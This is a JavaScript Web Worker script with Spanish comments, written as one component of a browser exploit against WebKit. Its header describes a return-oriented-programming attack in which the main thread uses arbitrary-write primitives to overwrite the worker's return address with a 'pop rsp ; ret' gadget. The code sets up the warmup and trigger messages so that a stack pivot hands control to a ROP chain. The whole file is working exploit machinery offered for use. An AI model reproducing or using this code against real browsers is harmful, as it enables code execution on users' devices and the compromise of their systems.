/**
 * rop_worker.js — Script del Web Worker para el ataque ROP
 *
 * Este archivo se usa como fuente del Worker que será víctima del
 * stack pivot. Se carga dinámicamente desde rop.js via Blob URL.
 *
 * El Worker tiene un handler onmessage que:
 *   1. Responde al mensaje de "calentamiento" para estabilizar su stack
 *   2. Responde al mensaje de "disparo" para que el ROP tome control
 *      al retornar de la función handler
 *
 * IMPORTANTE: Este script corre en un contexto aislado (Worker scope).
 * No tiene acceso a window, document, ni a las variables del hilo principal.
 * La comunicación es únicamente via postMessage / MessageChannel.
 *
 * Flujo del ataque:
 *   1. El hilo principal crea este Worker y le envía un mensaje de warmup
 *   2. El Worker responde → el hilo principal sabe que su stack está estable
 *   3. El hilo principal sobreescribe el return address en el stack del Worker
 *      usando las primitivas de escritura arbitraria
 *   4. El hilo principal envía un segundo postMessage
 *   5. onmessage() retorna → en lugar de volver a la rutina normal de WebKit,
 *      salta al gadget "pop rsp ; ret" → el ROP chain toma el control
 */

"use strict";

// ── Estado interno del Worker ─────────────────────────────────────────────

let messageCount = 0;

// ── Handler principal ─────────────────────────────────────────────────────

self.onmessage = function handleMessage(event) {
    messageCount++;

    const data  = event.data;
    const ports = event.ports;

    // ── Mensaje de calentamiento (warmup) ──────────────────────────────
    // El hilo principal envía 'warmup' como primer mensaje para:
    //   a) Asegurarse de que el thread del Worker está creado y corriendo
    //   b) Que el stack del Worker esté en un estado determinístico
    //      (la primera llamada a onmessage puede tener overhead de init)
    //   c) Confirmar que el canal de comunicación funciona

    if (data === 'warmup' || messageCount === 1) {
        if (ports && ports[0]) {
            // Notificamos al hilo principal que estamos listos
            ports[0].postMessage({ type: 'ready', pid: messageCount });
        }
        // Retornamos normalmente — en este punto el hilo principal
        // sobreescribirá nuestro return address para el siguiente mensaje
        return;
    }

    // ── Mensaje de disparo (trigger) ───────────────────────────────────
    // Este es el mensaje que activa el ROP. El hilo principal habrá
    // sobreescrito [stack + WORKER_RET_OFFSET] con el gadget pop rsp ; ret
    // justo antes de enviarlo.
    //
    // Cuando esta función retorne, en lugar de volver al scheduler de
    // mensajes de WebKit, saltará a nuestro gadget → pivot al ROP chain.
    //
    // El código de aquí abajo puede no ejecutarse si el ROP toma control
    // antes del return implícito de la función.

    if (ports && ports[0]) {
        // Este postMessage puede no llegar nunca si el ROP funciona correctamente.
        // Si llega, significa que el stack pivot falló.
        ports[0].postMessage({ type: 'rop_fallthrough', count: messageCount });
    }

    // Retorno implícito → aquí es donde el ROP debería tomar control
    // La dirección de retorno en el stack ha sido reemplazada por:
    //   gadget "pop rsp ; ret"  → nuevo RSP apunta al inicio del ROP chain
};

// ── Handler de errores ────────────────────────────────────────────────────

self.onerror = function handleError(error) {
    // Si hay un error en el Worker, lo reportamos de vuelta al hilo principal
    // usando postMessage global (sin puerto específico)
    self.postMessage({
        type:    'worker_error',
        message: error.message || String(error),
        line:    error.lineno,
        col:     error.colno,
    });
};

// ── Mensaje inicial de confirmación de carga ──────────────────────────────
// Notifica al hilo principal que el script del Worker se cargó correctamente.
// Esto permite detectar fallos de carga antes de intentar el exploit.

self.postMessage({ type: 'loaded' });
